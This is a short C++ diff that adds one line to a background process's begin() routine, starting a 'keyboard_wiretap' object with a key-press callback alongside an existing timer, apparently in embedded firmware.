@@ -16,6 +16,7 @@ BackgroundProcess::~BackgroundProcess()
 
 void BackgroundProcess::begin()
 {
+  keyboard_wiretap.begin(keyboard_press_callback);
   ticker_.attach_ms(TIMER_PERIOD, timer_callback);
 }
 
